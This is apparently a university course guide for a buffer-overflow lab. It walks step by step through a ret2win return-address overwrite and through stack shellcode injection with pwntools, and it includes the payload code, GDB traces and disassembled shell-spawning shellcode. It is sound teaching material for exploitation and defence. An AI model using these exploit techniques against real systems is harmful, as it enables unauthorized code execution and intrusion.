## CS3210 Buffer Overflow Demo Guide

A guide to everything you need to know for this demo!

### Challenge 1: ret2win

Can you exploit a vulnerable user input to redirect the execution flow of the program? 

Recall the layout of the stack in x86: 
```
---------------------
|   Local Variables | <= %esp
|     (i.e. buf)    |
---------------------
|    Base Pointer   | <= %ebp
---------------------
|   Return Address  |  
---------------------
|        ...        |
---------------------
```
Protections for this challenge: 

```
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

One of the most dangerous aspects of buffer overflows is how they can allow attackers to hijack execution flow of a binary. 
Because local buffers are stored on the stack alongside important values like the base pointer and return address of a function,
an insecure input function can very easily enable an attacker to write past the boundary of the buffer and "overflow" into these values. 

Inspecting the code for this challenge, we can see that it does the following: 

```
void win(void) {
    printf("You won!\n");
    fflush(stdout);
    exit(0);
}

void vuln(void) {
    char buf[64];
    printf("Enter an input:\n");
    read(0, buf, 256); <= insecure input!
    printf("You entered: %s\n", buf);
}

int main(void) {
    vuln();
    return 0;
}
```
Looking closely at the vuln() function, we can see that the read is clearly insecure - it allows the user to input 256 bytes into a 64 byte buffer without any termination or sanitation. 
Thus, our attack vector becomes clear: We will pad the buffer up to the space for the return address, and overwrite it with the address of win(). 

#### pwntools

To construct our exploit scripts, we will be making use of a very helpful python module called pwntools. In addition to allowing us to construct precise bytestream inputs for a target binary, 
it has functionality like tools to determine the offset required to hit a return address and automatic shellcode generation. For this first challenge, we will be making use of the [cyclic](https://docs.pwntools.com/en/stable/util/cyclic.html) tool. 

The cyclic function allows us to construct a unique non-repeating sequence of characters which is most commonly used to determine the required offset to reach a function's return address from the 
input buffer. The idea is that the non-repeating nature of the sequence allows us to easily determine how much padding was required to reach the return address based on the address that our program 
faults on (i.e. what the return address was overwritten with). 

We can see this in action by sending a payload using this cyclic pattern and observing the results in gdb via the --debug flag (this will need to be run in tmux!)

```
payload = cyclic(100)
```

When we run the program, we can see that we end up hitting a segfault with the following message: 

```
Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
```

We can then use cyclic_find (pwn cyclic -l in the terminal) to determine the offset this pattern occured at: 

```
student@5df7596926ed:/bufovf-demo/ret2win$ pwn cyclic -l 0x61616174
76
```
Great, looks like we need 76 bytes of padding to reach the return address! As it turns out, this lines up with what we can observe from within GDB: 

```
   0x08049205 <+30>:    lea    -0x48(%ebp),%eax
   0x08049208 <+33>:    push   %eax
   0x08049209 <+34>:    push   $0x0
   0x0804920b <+36>:    call   0x8049050 <read@plt>
```

We observe that the argument being loaded for the buffer location is at ebp - 0x48, or 72 bytes in decimal. Accounting for the additional 4 bytes required to overwrite the ebp
itself yields 76 bytes, as expected. Finally, we need to determine the address of win() for our function to return to. This is relatively simple to determine in GDB via disassembly of the win function, and should come out as
0x080491b6. 

We're almost ready to construct our payload! One last note - x86 is a little-endian system, and expects any addresses it reads from the stack to be structured accordingly. pwntools provides
us with the p32() to convert any value to an appropriately formatted little-endian 32-bit input, which we will use for this exploit. 

Thus, our payload will be as follows: 

```
  payload = b'A' * 76 <- padding to return address
  payload += p32(0x080491b6) <- return address, formatted as little-endian value
```
We run our script, and...

```
Enter an input:
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb6\x91\x04\x08
\xe9\xf1\xffp
You won!
```
Success! We got the "You won!" message to print out. 

### Challenge 2: 

No win() function now, but can you construct a payload that lets you read the flag? 
(Open a shell and cat /flag or whatever else you can get to work!)

Protections for this challenge: 

```
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
```

Even without an explicit win() function, we can essentially construct our own winning payload! The key difference in protections for this challenge is that our stack is **executable**. 
Thus, if we're able to determine the address our input is being written to, we can write arbitrary shellcode to the buffer and overwrite the return address to jump to our input. 

(Sound familiar? This is exactly the situation you covered on the practice exam!) 

For our input, we will once again be making use of pwntools, this time through the shellcraft function. [shellcraft](https://docs.pwntools.com/en/stable/shellcraft.html) is a module
used to generate a variety of shellcode, and for this challenge we will be using it to open a shell (via execve(path='/bin///sh', argv=['sh'], envp=0) - for more specifics, take a look
at the included shellcode.S asm file) Up to you how much you want to discuss this shellcode, but you can generate an assembly bytestream via asm(shellcraft.sh()) in your script. 

After sending this as our payload, we can inspect the buffer via GDB using the x/i instruction to interpret the data as instructions: 

```
x/20i $ebp-0x48
|   0xffa4fcb0:  push   $0x68
│   0xffa4fcb2:  push   $0x732f2f2f
│   0xffa4fcb7:  push   $0x6e69622f
│   0xffa4fcbc:  mov    %esp,%ebx
│   0xffa4fcbe:  push   $0x1010101
│   0xffa4fcc3:  xorl   $0x1016972,(%esp)
│   0xffa4fcca:  xor    %ecx,%ecx
│   0xffa4fccc:  push   %ecx
│   0xffa4fccd:  push   $0x4
│   0xffa4fccf:  pop    %ecx
│   0xffa4fcd0:  add    %esp,%ecx
│   0xffa4fcd2:  push   %ecx
│   0xffa4fcd3:  mov    %esp,%ecx
│   0xffa4fcd5:  xor    %edx,%edx
│   0xffa4fcd7:  push   $0xb
│   0xffa4fcd9:  pop    %eax
│   0xffa4fcda:  int    $0x80
| ...
```

Now all we have to do is figure out how to redirect execution to this code! For convenience, the challenge actually spits out the address of the buffer to the terminal for us 
(It was just a lot easier to do it this way, assume you got the leak through some other means). We can receive this value for use in our payload with the pwntools rcv functions:

```
p.recvuntil(b'buf is at ')
buf_addr = int(p.recvline().strip(), 16)
```

After constructing our full exploit consisting of the shellcode, padding, and buffer address, we can inspect the execution in GDB: 

```
(gdb) disas
│Dump of assembler code for function vuln:
| ...
│   0x080491ce <+40>:    call   0x8049050 <read@plt>
│   0x080491d3 <+45>:    add    $0x10,%esp
│   0x080491d6 <+48>:    nop
│   0x080491d7 <+49>:    leave
│=> 0x080491d8 <+50>:    ret
│End of assembler dump.
│(gdb) x/wx $esp
│0xffa4fcfc:     0xffa4fcb0 <- new return address, overwritten with buffer!
``` 
After stepping into the next instruction, we can see that our shellcode has successfully started execution!

```
(gdb) x/10i $eip
│=> 0xffa4fcb0:  push   $0x68
│   0xffa4fcb2:  push   $0x732f2f2f
│   0xffa4fcb7:  push   $0x6e69622f
│   0xffa4fcbc:  mov    %esp,%ebx
| ...
```
Once the shellcode executes, a shell should open for us to secure the flag. 
(Note - this might not work within GDB, but it should notify you that a shell process is starting)

Resources: 
- [Smashing the Stack](https://phrack.org/issues/49/smashing-the-stack-for-fun-and-profit)
- [CS 6265 Tutorials](https://tc.gts3.org/cs6265/tut/)
